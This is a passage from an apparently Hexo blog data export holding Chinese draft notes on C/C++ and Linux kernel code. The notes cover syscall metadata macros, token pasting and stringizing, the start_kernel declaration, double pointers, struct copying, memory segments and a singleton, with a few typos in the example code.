plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#ifdef CONFIG_FTRACE_SYSCALLS</span><br><span class=\"line\">#define SYSCALL_METADATA(sname, nb, ...)\t\t\t\\</span><br><span class=\"line\">\tstatic const char *types_##sname[] = &#123;\t\t\t\\</span><br><span class=\"line\">\t\t__MAP(nb,__SC_STR_TDECL,__VA_ARGS__)\t\t\\</span><br><span class=\"line\">\t&#125;;\t\t\t\t\t\t\t\\</span><br><span class=\"line\">\tstatic const char *args_##sname[] = &#123;\t\t\t\\</span><br><span class=\"line\">\t\t__MAP(nb,__SC_STR_ADECL,__VA_ARGS__)\t\t\\</span><br><span class=\"line\">\t&#125;;\t\t\t\t\t\t\t\\</span><br><span class=\"line\">\tSYSCALL_TRACE_ENTER_EVENT(sname);\t\t\t\\</span><br><span class=\"line\">\tSYSCALL_TRACE_EXIT_EVENT(sname);\t\t\t\\</span><br><span class=\"line\">\tstatic struct syscall_metadata __used\t\t\t\\</span><br><span class=\"line\">\t  __syscall_meta_##sname = &#123;\t\t\t\t\\</span><br><span class=\"line\">\t\t.name \t\t= &quot;sys&quot;#sname,\t\t\t\\</span><br><span class=\"line\">\t\t.syscall_nr\t= -1,\t/* Filled in at boot */\t\\</span><br><span class=\"line\">\t\t.nb_args \t= nb,\t\t\t\t\\</span><br><span class=\"line\">\t\t.types\t\t= nb ? types_##sname : NULL,\t\\</span><br><span class=\"line\">\t\t.args\t\t= nb ? args_##sname : NULL,\t\\</span><br><span class=\"line\">\t\t.enter_event\t= &amp;event_enter_##sname,\t\t\\</span><br><span class=\"line\">\t\t.exit_event\t= &amp;event_exit_##sname,\t\t\\</span><br><span class=\"line\">\t\t.enter_fields\t= LIST_HEAD_INIT(__syscall_meta_##sname.enter_fields), \\</span><br><span class=\"line\">\t&#125;;\t\t\t\t\t\t\t\\</span><br><span class=\"line\">\tstatic struct syscall_metadata __used\t\t\t\\</span><br><span class=\"line\">\t  __section(&quot;__syscalls_metadata&quot;)\t\t\t\\</span><br><span class=\"line\">\t *__p_syscall_meta_##sname = &amp;__syscall_meta_##sname;</span><br><span class=\"line\"></span><br><span class=\"line\">static inline int is_syscall_trace_event(struct trace_event_call *tp_event)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn tp_event-&gt;class == &amp;event_class_syscall_enter ||</span><br><span class=\"line\">\t       tp_event-&gt;class == &amp;event_class_syscall_exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#else</span><br><span class=\"line\">#define SYSCALL_METADATA(sname, nb, ...)</span><br><span class=\"line\"></span><br><span class=\"line\">static inline int is_syscall_trace_event(struct trace_event_call *tp_event)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">#ifend</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>if you define CONFIG_FTRACE_SYSCALLS in kconfig file,it will exe “ifdefine” block else it will exe “else” block. </p>\n<p>在C语言的宏定义中，## 操作符被称为“粘合”或“连接”操作符（token-pasting operator）。它的作用是将两个令牌（token）连接成一个新的令牌。这在宏定义和宏展开时非常有用，可以动态生成新的标识符或变量名。</p>\n<p>让我们详细解释一下：</p>\n<p>使用 ## 的例子<br>考虑以下宏定义：<br><code>#define CONCAT(a, b) a##b</code><br>如果我们使用这个宏：<br><code>CONCAT(foo, bar)</code><br>这将被预处理器展开为：<br><code>foobar</code></p>\n<p>在C语言的宏定义中，# 操作符被称为字符串化操作符（stringizing operator）。它的作用是将宏参数转换为字符串字面量。这在宏定义和预处理过程中非常有用，尤其是在需要生成字符串的情况下。</p>\n<p>解释 # 操作符<br>让我们详细解释一下 # 操作符的使用：</p>\n<p>字符串化操作符：</p>\n<p><code>#define TO_STRING(x) #x</code><br>这个宏 TO_STRING 将参数 x 转换为字符串字面量。例如：</p>\n<p><code>TO_STRING(hello)</code><br>这将被预处理器展开为：</p>\n<p><code>&quot;hello&quot;</code><br>在 SYSCALL_METADATA 宏中的使用：</p>\n<p>```.name = “sys”#sname,``<br>这里的 #sname 将 sname 宏参数转换为字符串字面量，并与 “sys” 连接在一起。<br>字符串强化</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> asmlinkage <span class=\"type\">void</span> __init __noreturn <span class=\"title function_\">start_kernel</span><span class=\"params\">(<span class=\"type\">void</span>)</span>;</span><br></pre></td></tr></table></figure>\n<p>这行代码声明了一个函数 start_kernel，其中包含了多个关键字和修饰符。每个关键字都有特定的含义和作用。下面我们逐个详细解释每个关键词的含义及其在这段代码中的用途：</p>\n<p>extern asmlinkage void __init __noreturn start_kernel(void);</p>\n<ol>\n<li><p>extern</p>\n<p> •    含义：extern 关键字表示 start_kernel 是一个外部函数，即它在其他文件中定义，而非在当前文件中实现。<br> •    作用：在多个源文件之间共享函数或变量时，extern 用于告诉编译器该函数的定义在别的文件中。这避免了重复定义的问题，并允许链接器在其他文件中找到函数的实际定义。</p>\n</li>\n</ol>\n<p>在这段代码中，extern 表示 start_kernel 函数的定义位于其他源文件中。</p>\n<ol start=\"2\">\n<li><p>asmlinkage</p>\n<p> •    含义：asmlinkage 是一个宏，用于指定函数的参数传递方式。它告诉编译器，函数的参数应从 堆栈 而不是 寄存器 中传递。<br> •    作用：asmlinkage 在 Linux 内核中常用于定义一些系统调用函数，使得它们可以按照固定的方式接收参数，从而符合调用约定。通过 asmlinkage，内核可以在不同的体系架构上保持一致的参数传递方式，特别是在 x86 和其他架构中。</p>\n</li>\n</ol>\n<p>在 ARM64 中，asmlinkage 会影响函数调用的 ABI（应用程序二进制接口），通常用于系统调用和某些特殊的内核函数，以确保调用者在调用函数时符合规定的参数传递方式。</p>\n<ol start=\"3\">\n<li><p>void</p>\n<p> •    含义：void 表示 start_kernel 函数没有返回值。<br> •    作用：这表明 start_kernel 函数执行后不会向调用者返回任何值。</p>\n</li>\n</ol>\n<p>这是 C 语言中用于声明函数返回值类型的标准关键字。void 返回类型常见于执行一系列操作后无需返回结果的函数。</p>\n<ol start=\"4\">\n<li><p>__init</p>\n<p> •    含义：__init 是一个内核特定的宏，用于标识只在初始化阶段使用的函数或数据。<br> •    作用：在 Linux 内核中，__init 修饰的函数或数据会放入专门的 .init 段（section）。在系统启动完成后，这段内存会被释放，以节省内存资源。</p>\n</li>\n</ol>\n<p>标记为 __init 的函数或数据会在初始化完成后被内核自动丢弃，因此仅在初始化期间有效。在 start_kernel 中使用 __init 表示它是一个只在系统启动时调用的初始化函数。</p>\n<ol start=\"5\">\n<li><p>__noreturn</p>\n<p> •    含义：__noreturn 是一个函数属性，用来告诉编译器该函数不会返回到调用者。<br> •    作用：编译器使用 __noreturn 来优化代码和发出警告。如果一个标记了 __noreturn 的函数尝试返回，编译器会给出警告。</p>\n</li>\n</ol>\n<p>在内核中，__noreturn 表示函数会在执行过程中进入无限循环或在某种情况下导致系统重启、关机等操作，因此永远不会返回。</p>\n<ol start=\"6\">\n<li><p>start_kernel(void)</p>\n<p> •    start_kernel：这是函数的名称，表示该函数是内核启动过程中的主入口点。start_kernel 是 Linux 内核的核心初始化函数，负责从系统启动到内核完全初始化的过渡。<br> •    (void)：表示该函数不接受任何参数。</p>\n</li>\n</ol>\n<p>综合解释</p>\n<p>这行代码声明了一个外部函数 start_kernel，它具有以下特性：</p>\n<pre><code>•    定义在其他源文件中；\n•    参数从堆栈传递；\n•    不返回任何值；\n•    仅在内核初始化阶段有效，之后会被释放；\n•    不会返回给调用者（即它是一个无限循环或最终会导致系统不再执行任何其他代码的函数）；\n</code></pre>\n<p>整体含义</p>\n<p>start_kernel 是内核初始化的入口函数之一，负责从引导加载程序过渡到完全初始化的操作系统内核。它在初始化完成后不再需要，因此标记为 __init。因为这个函数在启动后不会再返回，标记为 __noreturn。</p>\n"},{"_content":"开发规范\n\n```\n\nint AndroidBitmap_getInfo(AndroidBitmapInfo* bitmapInfo){\n\nif(bitmapInfo == NULL){\n    return -1;\n}\nreturn 0;\n}\n\n```\n\n1.通过指针在方法里赋值\n2.一定要考虑健壮性\n3.利用返回值进行异常抛出\n4.不要修改传入的指针，可以加const ，及 AndroidBitMapInfo* const bitmapInfo\n\n\n二级指针\nvoid set(char** str){\n    *str = \"test\";\n}\n\nvoid main(){\n    char* name = NULL;\n    set(&name);\n\n    printf(\"name = %s\",name);\n}\n虽然NULL地址无法赋值，但是这里是没问题的\n这里是没问题的，因为传入的是二级指针，所以\n*str = \"test\",改变的是name这个指针变量的值\n\n\nconst 在c和cpp中的区别\n\n二级指针的内存模式\n\n指针数组：数组指针指向的数组元素的首地址\n```c\nstruct FILE\n{\n    char* filename;\n    int length;\n\n}\n\nvoid main(){\n    char* name =\"test\";\n    //二级指针，看成二维数组\n    char** nameP = &name;\n\n    //比如压缩文件，指定两个东西FILE ,一个是输入，一个是输出\n    //定义一个FILE* 指针数组\n\n    FILE* file[2]={{\"in.mp4\"},{\"out.mp4\"}};\n\n    FILE** file1;//另外一种定义的方式（指针数组）（二级指针）其实是同一个概念，其实不是（栈中表现不同）\n    //数组指针指向的是数组元素的首地址\n\n    int number =100;\n    int* numberP = &number;//一级指针，一级数组\n    numberP++;\n    printf(\"number is %d\",*numberP);\n\n}\n```\n//单独的来拿字符串数组来讲\n\n```c\nvoid main(){\n\n    char* name[10] = {\"aaa\",\"bbbb\",\"cccc\"};//后面默认指向的是null指针 都是静态常量\n\n    char** name = {\"aaa\",\"bbbb\"};//报错\n    //直接去赋值那么c和cpp的编译器会识别为二级指针，所以指针数组/二级指针不同\n\n\n    char name[10][30] = {\"aaa\",\"bbbb\",\"cccc\"};//这几个都是从静态常量区copy到栈的buffer里面的\n    //如果 name 用char** 去接 \n\n    int len =4;\n    char** params = malloc(sizeof(char*)*len);//开辟二维数组\n    //开辟一维度数组\n    for(int i=0;i<len;i++){\n        params[i] = malloc(sizeof(char*)*100);\n    }\n\n    //释放数组\n    for(int i=0;i<len;i++){\n        if(params[i]!=NULL){\n            free(params[i]);\n            params[i]=NULL;\n        }\n    }\n    if(params!=NULL){\n        free(params);\n        params=NULL;\n    }\n}\n```\n结构提赋值\n在c中等于相当于是内容赋值操作\n```c\ntypedef struct{\n    char name[10];\n    int age;\n}Student;\n\nStudent stu1 = {\"name\",24};\nStudent stu2;\nstu2 = stu1;// = 赋值的操作，java中stu2对象会变成stu1,但是c中不会，stu1 和 stu2是不同的结构体 \n\n//但是如果结构体是\ntydef struct {\n    char* name;\n    int age;\n}Student;\nStudent stu1 = {\"name\",24};//会报错\n//从内存角度来看？\n\n\nvoid copyTo(Student* stu1,Student *stu2){\n    *stu1 = *stu2;//指针的赋值运算是一个浅拷贝，即stu1 和 stu2的name变量不同，但是同时指向一个地址（即变量的值是同一个）因此当释放stu1.name后，stu1.name 值对应的那一块区域已经被释放了 ，如果继续释放stu2.name，就会出错误。\n    \n    }\n```\ncpp\n```\n\n\n\n\n```\n静态局部变量在内存中存储于静态存储区.\n在 C++ 程序运行时，内存通常划分为以下几个区域：\n\t1.\t代码段（文本段）：存储程序的可执行代码。\n\t2.\t全局数据区（静态存储区）：\n\t•\t已初始化的全局变量和静态变量：存储在数据段。\n\t•\t未初始化的全局变量和静态变量：存储在 BSS 段。\n\t3.\t堆区：用于动态内存分配（如 new、malloc）。\n\t4.\t栈区：用于存储函数的参数、返回地址和自动变量（非静态的局部变量）。\n内存布局示意图\n```\n+------------------+\n| 代码段（文本段）   |\n+------------------+\n|  已初始化的全局变量  |\n|  和静态变量（数据段）|\n+------------------+\n| 未初始化的全局/静态变量 |\n|    （BSS 段）     |\n+------------------+\n|       堆区        |\n|  （向上增长）     |\n+------------------+\n|       栈区        |\n|  （向下增长）     |\n+------------------+\n```\n## 单例中的静态局部变量分析\n静态局部变量的存储区域\n\n•\t未初始化的静态局部变量：存储在 .bss 段（未初始化数据段）。\n•\t已初始化的静态局部变量：存储在 .data 段（已初始化数据段）。\n```c\nclass Singleton {\npublic:\n    static Singleton& getInstance() {\n        static Singleton instance; // 静态局部变量\n        return instance;\n    }\n\nprivate:\n    Singleton() {} // 私有构造函数\n}; \n```\n* instance 的声明：static Singleton instance;，这是一个未显式初始化的静态局部变量。\n* 存储位置：由于未显式初始化，instance 的内存空间被分配在 .bss 段。\n•\t初始化时机：\n    •\t内存分配：在程序加载时，instance 的内存空间被分配在 .bss 段。\n    •\t构造函数调用：在程序运行时，第一次调用 getInstance() 时，Singleton 的构造函数被调用，对 instance 进行初始化。\n为什么存储在 .bss 段？\n\n.bss 段的特点\n\t•\t存储未初始化的全局变量和静态变量。\n\t•\t内存分配：在程序加载时，系统为 .bss 段分配内存，并自动将其初始化为零。\n\t•\t优势：不需要在可执行文件中存储初始值，减小了文件大小。\n内存布局示意图\n```\n+------------------+\n| .bss 段          |\n| - instance 的内存空间 (全零) |占用\n+------------------+\n```\n\n```\n+------------------+\n| .bss 段          |\n| - instance 的内存空间 (已初始化) |\n+------------------+\n```\n\nexplicit关键字\nhttps://www.cnblogs.com/rednodel/p/9299251.html\n\n显示声明构造函数，防止隐式转换\n\n\n","source":"_drafts/cpp.md","raw":"开发规范\n\n```\n\nint AndroidBitmap_getInfo(AndroidBitmapInfo* bitmapInfo){\n\nif(bitmapInfo == NULL){\n    return -1;\n}\nreturn 0;\n}\n\n```\n\n1.通过指针在方法里赋值\n2.一定要考虑健壮性\n3.利用返回值进行异常抛出\n4.不要修改传入的指针，可以加const ，及 AndroidBitMapInfo* const bitmapInfo\n\n\n二级指针\nvoid set(char** str){\n    *str = \"test\";\n}\n\nvoid main(){\n    char* name = NULL;\n    set(&name);\n\n    printf(\"name = %s\",name);\n}\n虽然NULL地址无法赋值，但是这里是没问题的\n这里是没问题的，因为传入的是二级指针，所以\n*str = \"test\",改变的是name这个指针变量的值\n\n\nconst 在c和cpp中的区别\n\n二级指针的内存模式\n\n指针数组：数组指针指向的数组元素的首地址\n```c\nstruct FILE\n{\n    char* filename;\n    int length;\n\n}\n\nvoid main(){\n    char* name =\"test\";\n    //二级指针，看成二维数组\n    char** nameP = &name;\n\n    //比如压缩文件，指定两个东西FILE ,一个是输入，一个是输出\n    //定义一个FILE* 指针数组\n\n    FILE* file[2]={{\"in.mp4\"},{\"out.mp4\"}};\n\n    FILE** file1;//另外一种定义的方式（指针数组）（二级指针）其实是同一个概念，其实不是（栈中表现不同）\n    //数组指针指向的是数组元素的首地址\n\n    int number =100;\n    int* numberP = &number;//一级指针，一级数组\n    numberP++;\n    printf(\"number is %d\",*numberP);\n\n}\n```\n//单独的来拿字符串数组来讲\n\n```c\nvoid main(){\n\n    char* name[10] = {\"aaa\",\"bbbb\",\"cccc\"};//后面默认指向的是null指针 都是静态常量\n\n    char** name = {\"aaa\",\"bbbb\"};//报错\n    //直接去赋值那么c和cpp的编译器会识别为二级指针，所以指针数组/二级指针不同\n\n\n    char name[10][30] = {\"aaa\",\"bbbb\",\"cccc\"};//这几个都是从静态常量区copy到栈的buffer里面的\n    //如果 name 用char** 去接 \n\n    int len =4;\n    char** params = malloc(sizeof(char*)*len);//开辟二维数组\n    //开辟一维度数组\n    for(int i=0;i<len;i++){\n        params[i] = malloc(sizeof(char*)*100);\n    }\n\n    //释放数组\n    for(int i=0;i<len;i++){\n        if(params[i]!=NULL){\n            free(params[i]);\n            params[i]=NULL;\n        }\n    }\n    if(params!=NULL){\n        free(params);\n        params=NULL;\n    }\n}\n```\n结构提赋值\n在c中等于相当于是内容赋值操作\n```c\ntypedef struct{\n    char name[10];\n    int age;\n}Student;\n\nStudent stu1 = {\"name\",24};\nStudent stu2;\nstu2 = stu1;// = 赋值的操作，java中stu2对象会变成stu1,但是c中不会，stu1 和 stu2是不同的结构体 \n\n//但是如果结构体是\ntydef struct {\n    char* name;\n    int age;\n}Student;\nStudent stu1 = {\"name\",24};//会报错\n//从内存角度来看？\n\n\nvoid copyTo(Student* stu1,Student *stu2){\n    *stu1 = *stu2;//指针的赋值运算是一个浅拷贝，即stu1 和 stu2的name变量不同，但是同时指向一个地址（即变量的值是同一个）因此当释放stu1.name后，stu1.name 值对应的那一块区域已经被释放了 ，如果继续释放stu2.name，就会出错误。\n    \n    }\n```\ncpp\n```\n\n\n\n\n```\n静态局部变量在内存中存储于静态存储区.\n在 C++ 程序运行时，内存通常划分为以下几个区域：\n\t1.\t代码段（文本段）：存储程序的可执行代码。\n\t2.\t全局数据区（静态存储区）：\n\t•\t已初始化的全局变量和静态变量：存储在数据段。\n\t•\t未初始化的全局变量和静态变量：存储在 BSS 段。\n\t3.\t堆区：用于动态内存分配（如 new、malloc）。\n\t4.\t栈区：用于存储函数的参数、返回地址和自动变量（非静态的局部变量）。\n内存布局示意图\n```\n+------------------+\n| 代码段（文本段）   |\n+------------------+\n|  已初始化的全局变量  |\n|  和静态变量（数据段）|\n+------------------+\n| 未初始化的全局/静态变量 |\n|    （BSS 段）     |\n+------------------+\n|       堆区        |\n|  （向上增长）     |\n+------------------+\n|       栈区        |\n|  （向下增长）     |\n+------------------+\n```\n## 单例中的静态局部变量分析\n静态局部变量的存储区域\n\n•\t未初始化的静态局部变量：存储在 .bss 段（未初始化数据段）。\n•\t已初始化的静态局部变量：存储在 .data 段（已初始化数据段）。\n```c\nclass Singleton {\npublic:\n    static Singleton& getInstance() {\n        static Singleton instance; // 静态局部变量\n        return instance;\n    }\n\nprivate:\n    Singleton() {} // 私有构造函数\n}; \n```\n* instance 的声明：static Singleton instance;，这是一个未显式初始化的静态局部变量。\n* 存储位置：由于未显式初始化，instance 的内存空间被分配在 .bss 段。\n•\t初始化时机：\n    •\t内存分配：在程序加载时，instance 的内存空间被分配在 .bss 段。\n    •\t构造函数调用：在程序运行时，第一次调用 getInstance() 时，Singleton 的构造函数被调用，对 instance 进行初始化。\n为什么存储在 .bss 段？\n\n.bss 段的特点\n\t•\t存储未初始化的全局变量和静态变量。\n\t•\t内存分配：在程序加载时，系统为 .bss 段分配内存，并自动将其初始化为零。\n\t•\t优势：不需要在可执行文件中存储初始值，减小了文件大小。\n内存布局示意图\n```\n+------------------+\n| .bss 段          |\n| - instance 的内存空间 (全零) |占用\n+------------------+\n```\n\n```\n+------------------+\n| .bss 段          |\n| - instance 的内存空间 (已初始化) |\n+------------------+\n```\n\nexplicit关键字\nhttps://www.cnblogs.com/rednodel/p/9299251.html\n\n显示声明构造函数，防止隐式转换\n\n\n","slug":"cpp","published":0,"date":"2024-11-23T11:19:05.108Z","updated":"2025-03-30T07:37:57.216Z","title":"","comments":1,"layout":"post","photos":[],"link":"","_id":"cmd44rit0000dv8fyeyacedo8","content":"<p>开发规范</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">int AndroidBitmap_getInfo(AndroidBitmapInfo* bitmapInfo)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">if(bitmapInfo == NULL)&#123;</span><br><span class=\"line\">    return -1;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>1.通过指针在方法里赋值<br>2.一定要考虑健壮性<br>3.利用返回值进行异常抛出<br>4.不要修改传入的指针，可以加const ，及 AndroidBitMapInfo* const bitmapInfo</p>\n<p>二级指针<br>void set(char** str){<br>    *str = “test”;<br>}</p>\n<p>void main(){<br>    char* name = NULL;<br>    set(&amp;name);</p>\n<pre><code>printf(&quot;name = %s&quot;,name);\n</code></pre>\n<p>}<br>虽然NULL地址无法赋值，但是这里是没问题的<br>这里是没问题的，因为传入的是二级指针，所以<br>*str = “test”,改变的是name这个指针变量的值</p>\n<p>const 在c和cpp中的区别</p>\n<p>二级指针的内存模式</p>\n<p>指针数组：数组指针指向的数组元素的首地址</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">FILE</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* filename;</span><br><span class=\"line\">    <span class=\"type\">int</span> length;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span>* name =<span class=\"string\">&quot;test&quot;</span>;</span><br><span class=\"line\">    <span class=\"comment\">//二级指针，看成二维数组</span></span><br><span class=\"line\">    <span class=\"type\">char</span>** nameP = &amp;name;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//比如压缩文件，指定两个东西FILE ,一个是输入，一个是输出</span></span><br><span class=\"line\">    <span class=\"comment\">//定义一个FILE* 指针数组</span></span><br><span class=\"line\"></span><br><span class=\"line\">    FILE* file[<span class=\"number\">2</span>]=&#123;&#123;<span class=\"string\">&quot;in.mp4&quot;</span>&#125;,&#123;<span class=\"string\">&quot;out.mp4&quot;</span>&#125;&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    FILE** file1;<span class=\"comment\">//另外一种定义的方式（指针数组）（二级指针）其实是同一个概念，其实不是（栈中表现不同）</span></span><br><span class=\"line\">    <span class=\"comment\">//数组指针指向的是数组元素的首地址</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> number =<span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span>* numberP = &amp;number;<span class=\"comment\">//一级指针，一级数组</span></span><br><span class=\"line\">    numberP++;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;number is %d&quot;</span>,*numberP);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>//单独的来拿字符串数组来讲</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span>* name[<span class=\"number\">10</span>] = &#123;<span class=\"string\">&quot;aaa&quot;</span>,<span class=\"string\">&quot;bbbb&quot;</span>,<span class=\"string\">&quot;cccc&quot;</span>&#125;;<span class=\"comment\">//后面默认指向的是null指针 都是静态常量</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span>** name = &#123;<span class=\"string\">&quot;aaa&quot;</span>,<span class=\"string\">&quot;bbbb&quot;</span>&#125;;<span class=\"comment\">//报错</span></span><br><span class=\"line\">    <span class=\"comment\">//直接去赋值那么c和cpp的编译器会识别为二级指针，所以指针数组/二级指针不同</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">10</span>][<span class=\"number\">30</span>] = &#123;<span class=\"string\">&quot;aaa&quot;</span>,<span class=\"string\">&quot;bbbb&quot;</span>,<span class=\"string\">&quot;cccc&quot;</span>&#125;;<span class=\"comment\">//这几个都是从静态常量区copy到栈的buffer里面的</span></span><br><span class=\"line\">    <span class=\"comment\">//如果 name 用char** 去接 </span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"type\">int</span> len =<span class=\"number\">4</span>;</span><br><span class=\"line\">    <span class=\"type\">char</span>** params = <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>*)*len);<span class=\"comment\">//开辟二维数组</span></span><br><span class=\"line\">    <span class=\"comment\">//开辟一维度数组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;len;i++)&#123;</span><br><span class=\"line\">        params[i] = <span class=\"built_in\">malloc</span>(<span class=\"keyword\">sizeof</span>(<span class=\"type\">char</span>*)*<span class=\"number\">100</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//释放数组</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"type\">int</span> i=<span class=\"number\">0</span>;i&lt;len;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(params[i]!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">            <span class=\"built_in\">free</span>(params[i]);</span><br><span class=\"line\">            params[i]=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(params!=<span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">        <span class=\"built_in\">free</span>(params);</span><br><span class=\"line\">        params=<span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结构提赋值<br>在c中等于相当于是内容赋值操作</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span>&#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> name[<span class=\"number\">10</span>];</span><br><span class=\"line\">    <span class=\"type\">int</span> age;</span><br><span class=\"line\">&#125;Student;</span><br><span class=\"line\"></span><br><span class=\"line\">Student stu1 = &#123;<span class=\"string\">&quot;name&quot;</span>,<span class=\"number\">24</span>&#125;;</span><br><span class=\"line\">Student stu2;</span><br><span class=\"line\">stu2 = stu1;<span class=\"comment\">// = 赋值的操作，java中stu2对象会变成stu1,但是c中不会，stu1 和 stu2是不同的结构体 </span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//但是如果结构体是</span></span><br><span class=\"line\">tydef <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span>* name;</span><br><span class=\"line\">    <span 